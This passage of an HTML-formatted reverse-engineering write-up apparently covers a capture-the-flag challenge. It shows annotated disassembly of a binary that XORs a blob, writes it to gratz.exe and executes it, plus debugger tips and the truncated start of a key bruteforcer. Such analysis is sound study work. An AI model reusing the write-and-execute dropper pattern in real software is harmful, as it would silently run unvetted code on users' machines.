&lt;p&gt;&lt;img src=&#34;http://parsiya.net/images/2014/flare/7-22.jpg&#34; alt=&#34;xor(blob,&amp;quot;jackRAT&amp;quot;)&#34; title=&#34;xor(blob,&amp;quot;jackRAT&#34; /&gt;&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;jackRAT xor&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;blob&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;xor(blob,&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;jackRAT&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;h3 id=&#34;are-we-there-yet-gratz-but-not-yet:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;Are we there yet? gratz but not yet&lt;/h3&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B83&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;loc_401B83&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;                             &lt;span style=&#34;color: #586E75&#34;&gt;; CODE XREF: .text:00401B58j&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B83&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;InternetRootz&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B88&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;jackRAT&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B8D&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;          &lt;span style=&#34;color: #586E75&#34;&gt;; you are here&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B90&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;movzx&lt;/span&gt;   &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;   &lt;span style=&#34;color: #586E75&#34;&gt;; application crashes here if no arguments are provided&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B93&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;bl&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;ob&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;dl&lt;/span&gt;              &lt;span style=&#34;color: #586E75&#34;&gt;; blob[0] = arg1[0]; first character of arg1 written to blob&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B99&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B9C&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;cl&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;           &lt;span style=&#34;color: #586E75&#34;&gt;; cl = arg1[1]; second character of arg1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;B9F&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #DC322F&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;_4131F9&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;cl&lt;/span&gt;       &lt;span style=&#34;color: #586E75&#34;&gt;; blob[1] = arg1[1];&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BA5&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;          &lt;span style=&#34;color: #586E75&#34;&gt;; edx = *(arg2);&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BA8&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;al&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;             &lt;span style=&#34;color: #586E75&#34;&gt;; al = arg2[0];&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BAA&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #DC322F&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;_413278&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;al&lt;/span&gt;       &lt;span style=&#34;color: #586E75&#34;&gt;; blob[0x80] = arg2[0]; 413278 - 413F9 = 0x7F&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BAF&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;          &lt;span style=&#34;color: #586E75&#34;&gt;; ecx = *(arg2);&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BB2&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;movzx&lt;/span&gt;   &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;byte&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; edx = arg2[1];&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BB6&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;10h&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BB9&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;offset&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;aWb&lt;/span&gt;            &lt;span style=&#34;color: #586E75&#34;&gt;; mode: &amp;quot;wb&amp;quot; - write in binary mode&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BBE&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;                   &lt;span style=&#34;color: #586E75&#34;&gt;; push current path&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BBF&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #DC322F&#34;&gt;byte&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;_413279&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;dl&lt;/span&gt;       &lt;span style=&#34;color: #586E75&#34;&gt;; blob[0x81] = arg2[1];&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BC5&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #DC322F&#34;&gt;dword&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;10h&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;74617267h&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BCC&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #DC322F&#34;&gt;dword&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0Ch&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;78652E7Ah&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BD3&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #DC322F&#34;&gt;word&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;ptr&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt; &lt;span style=&#34;color: #2AA198&#34;&gt;65h&lt;/span&gt; &lt;span style=&#34;color: #586E75&#34;&gt;; &amp;quot;gratz.exe&amp;quot; saved in [ebp-10]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BD9&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;_fopen&lt;/span&gt;                &lt;span style=&#34;color: #586E75&#34;&gt;; fopen(filename=&amp;quot;currentpath\gratz.exe&amp;quot;,mode=&amp;quot;wb&amp;quot;); Open if exists and if not create it&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BDE&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;bl&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;ob_length&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BE4&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;              &lt;span style=&#34;color: #586E75&#34;&gt;; *(gratz.exe)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BE6&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;                   &lt;span style=&#34;color: #586E75&#34;&gt;; FILE = *(gratz.exe)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BE7&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;                   &lt;span style=&#34;color: #586E75&#34;&gt;; size = blob length&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BE8&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;                     &lt;span style=&#34;color: #586E75&#34;&gt;; count = 1&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BEA&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;offset&lt;/span&gt; &lt;span style=&#34;color: #B58900&#34;&gt;bl&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;ob&lt;/span&gt;           &lt;span style=&#34;color: #586E75&#34;&gt;; buffer = *(blob)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BEF&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;_fwrite&lt;/span&gt;               &lt;span style=&#34;color: #586E75&#34;&gt;; fwrite( *(blob), 1, blob_length, *(gratz.exe) ); Write blob to gratz.exe&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BF4&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;esi&lt;/span&gt;                   &lt;span style=&#34;color: #586E75&#34;&gt;; push *(gratz.exe)&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BF5&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;_fclose&lt;/span&gt;               &lt;span style=&#34;color: #586E75&#34;&gt;; fclose( *(gratz.exe) ); Close gratz.exe&lt;/span&gt;

&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BFA&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;lea&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;10h&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;        &lt;span style=&#34;color: #586E75&#34;&gt;; edx = &amp;quot;gratz.exe&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BFD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;push&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;edx&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;BFE&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;call&lt;/span&gt;    &lt;span style=&#34;color: #268BD2&#34;&gt;_system&lt;/span&gt;               &lt;span style=&#34;color: #586E75&#34;&gt;; system(&amp;quot;gratz.exe&amp;quot;); Execute gratz.exe&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;.text:00401&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;C03&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color: #B58900&#34;&gt;ecx&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;The application crashed in line 5 over and over again. When I looked inside ecx I saw empty space but looking around I saw the application&amp;rsquo;s complete path. After a while I realized that the code is trying to read arguments. The rest is obvious from the code. First two characters of first argument are written over the first two characters of the blob. First and second characters of second argument are written at offset &lt;code&gt;0x80&lt;/code&gt; and &lt;code&gt;0x81&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Then &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/yeby3zcb.aspx&#34; target=&#34;_blank&#34;&gt;fopen&lt;/a&gt; is called to create/open a file named &lt;code&gt;gratz.exe&lt;/code&gt; for writing in binary mode (&amp;ldquo;wb&amp;rdquo;). Then blob is written to it by calling &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/h9t88zwz.aspx&#34; target=&#34;_blank&#34;&gt;fwrite&lt;/a&gt; and finally it is closed with &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/fxfsw25t.aspx&#34; target=&#34;_blank&#34;&gt;fclose&lt;/a&gt;. Then command &lt;code&gt;gratz.exe&lt;/code&gt; is run via the &lt;a href=&#34;http://msdn.microsoft.com/en-us/library/277bwbdz.aspx&#34; target=&#34;_blank&#34;&gt;system&lt;/a&gt; call. So we are writing the blob to a file and then executing it.&lt;/p&gt;

&lt;p&gt;What is special about first two bytes in a Windows binary? It&amp;rsquo;s the start of the DOS stub with the magic bytes &lt;code&gt;MZ&lt;/code&gt; and you have already guessed that the second argument should be &lt;code&gt;PE&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&#34;how-do-i-xor:94bf06dd1bee42f6b34a1ff79274f7e7&#34;&gt;How do I XOR?&lt;/h3&gt;

&lt;p&gt;But how do we get the correct binary. As we have already seen, there are a series of checks and depending on the checks, different strings are xor-ed with the original blob. A correct sequence of strings will produce a correct binary. The path is probably known at this point, just bypass any Anti-VM/Anti-Debug countermeasures and other checks. But I am lazy and instead wrote a bruteforcer. In order for the bruteforcer to work, we need the original blob before any xors. That is easy. Set a breakpoint before any of the functions. Then set the Instruction Pointer to &lt;code&gt;00401B8D&lt;/code&gt; and step through after the breakpoint. Stop before the &lt;code&gt;system&lt;/code&gt; call and copy the &lt;code&gt;gratz.exe&lt;/code&gt; file from disk.&lt;/p&gt;

&lt;p&gt;Here&amp;rsquo;s my bruteforcer. This is not good code but at that point I just wanted to finish.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;bruteforcer&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;key1&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;{}&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key1[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;oh happy dayz&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;key1[&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;the final countdown&amp;#39;&lt;/span&gt;
 
